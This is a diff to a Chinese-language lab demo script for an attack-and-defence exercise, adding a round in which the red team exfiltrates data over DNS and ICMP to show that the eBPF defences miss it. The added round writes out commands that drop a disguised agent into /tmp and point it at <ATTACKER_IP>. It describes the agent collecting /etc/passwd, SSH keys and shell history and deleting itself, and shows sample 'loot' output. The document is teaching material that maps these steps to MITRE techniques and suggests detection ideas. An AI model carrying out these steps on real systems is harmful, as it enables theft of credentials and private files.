@@ -486,6 +486,68 @@ Listener 不會收到連線（進程在 connect() 前被殺）。
 
 ---
 
+## 回合 7 — 紅方資料外傳（防禦缺口展示）
+
+> **目的**：展示即使兩層防禦都開著，DNS/ICMP covert channel 的 data exfiltration 仍然偵測不到
+> **MITRE ATT&CK**: T1005 (Data from Local System), T1048.003 (Exfiltration Over Alternative Protocol)
+
+### T3 — 啟動 Exfil Listener（WSL2）
+
+```bash
+sudo .venv/bin/python3 red_team/exfil_listener.py
+```
+
+預期輸出：
+```
+[*] Exfil Listener starting...
+[*] DNS listener on UDP 53 (interface: eth0)
+[*] ICMP listener ready
+[*] Waiting for incoming data...
+```
+
+### T4 — 在靶機部署 Exfil Agent
+
+在已有的 shell session 裡（Round 5 成功連線後、v2 升級前取得的 access），用 base64 one-liner 部署：
+
+```bash
+echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
+python3 /tmp/.cache_update.py <ATTACKER_IP>
+```
+
+Agent 會自動：
+1. 蒐集 `/etc/passwd`、`~/.ssh/*`、`~/.bash_history`、`~/vuln_api.py` 等
+2. 偵測可用通道（DNS 優先，ICMP 備用）
+3. Base32 編碼 + 分塊，透過 DNS query 送出
+4. 完成後自動刪除自身
+
+### T3 — 觀察接收
+
+預期輸出：
+```
+[+] START file_id=a1b2 filename=passwd
+[+] Receiving: 0003/0042 (a1b2)
+...
+[+] END file_id=a1b2 checksum=OK
+[+] Saved: ./loot/passwd
+
+[+] START file_id=c3d4 filename=bash_history
+...
+[+] Saved: ./loot/bash_history
+```
+
+### T2 — 觀察 eBPF v2（仍在跑）
+
+**重點：eBPF v2 沒有任何 alert。** DNS query 走的是正常的 UDP 53，不觸發任何被監控的 syscall pattern（沒有 memfd_create、沒有 reverse shell 的 dup2 pattern）。
+
+### 講解要點
+
+- 目前的防禦只監控 C2 建立（memfd、reverse shell），不監控 data exfiltration
+- DNS exfiltration 需要另外的偵測機制（分析 DNS query pattern、subdomain 長度異常等）
+- 這說明了即使有兩層防禦，攻擊者還是能找到 blind spot
+- **結論**：defense-in-depth 是持續的過程，不是部署完就結束
+
+---
+
 ## 結尾總結
 
 ### 攻防時間線
@@ -496,10 +558,10 @@ Listener 不會收到連線（進程在 connect() 前被殺）。
 nmap      nc 2222      ip alias    SSTI+memfd    cold-start     eBPF kill
           MDR封鎖      繞過封鎖    ICMP C2        /proc scan     memfd blocked
 
-回合5         回合6
-紅方繞過v1 → 藍方升級v2攔截
-reverse shell  connect hook
-TCP bypass     port detect
+回合5         回合6           回合7
+紅方繞過v1 → 藍方升級v2攔截 → 紅方外傳資料（防禦缺口）
+reverse shell  connect hook     DNS exfiltration
+TCP bypass     port detect      eBPF 偵測不到
 ```
 
 ### 防禦分層架構
@@ -531,6 +593,8 @@ TCP bypass     port detect
 | T1095 | Non-App Layer Protocol | ICMP covert C2 |
 | T1095 | Non-Application Layer Protocol | TCP reverse shell (raw TCP) |
 | T1571 | Non-Standard Port | C2 on port 4444 |
+| T1005 | Data from Local System | exfil agent 蒐集本機檔案 |
+| T1048.003 | Exfil Over Alt Protocol | DNS/ICMP data exfiltration |
 
 **偵測覆蓋：**
 
